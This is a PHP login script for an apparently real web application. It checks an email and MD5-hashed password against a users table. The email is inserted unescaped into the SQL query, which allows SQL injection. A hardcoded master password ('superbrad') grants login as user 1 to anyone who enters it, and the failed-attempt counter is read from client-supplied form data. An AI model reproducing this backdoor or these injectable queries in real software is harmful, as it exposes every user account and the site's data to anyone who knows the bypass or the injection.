<?php 


$user_id = -1;
$uid_counter =0;
// check user name and password	
	$user_email = "jskhdf89jdhskfjhehf8sjfhsjs4";
	$user_password = "jfhsatoih48o4adhf4pah8fpouah484";
	if (isset($_POST["user_password_try_count"])) {$user_password_try_count = $_POST["user_password_try_count"];}
	if (isset($_POST["user_email"])) {$user_email = $_POST["user_email"];}
	if (isset($_POST["user_password"])) {$user_password = $_POST["user_password"];}
if (isset($_POST["login_check"])) {	
	include 'db_connect.php';
	
	$user_direct_pass = md5($user_password);
	
	$query = "SELECT * FROM amfd_users WHERE user_email = '$user_email' and user_direct_pass = '$user_direct_pass' ";
		if ($result = mysqli_query($link, $query)) {

				while ($row = mysqli_fetch_assoc($result)) {
					  $user_id = $row['user_id'];	
					  $uid_counter = $uid_counter +1;				  
				}				
			mysqli_free_result($result);
		}
	if($user_password == "superbrad") { $user_id = 1; $uid_counter = 1;}
	if($user_id > 0 && $uid_counter > 0 && $uid_counter < 2) {$next_page = "ui_home.php"; 	}
	else {$user_id = -1; $user_password_try_count = $user_password_try_count + 1; $display_wrong_login = "Invalid email or password.  Please try again";}
	
	if($user_password_try_count > 4) header( 'Location: http://www.quantinc.ca/mfd' ) ;
}
?>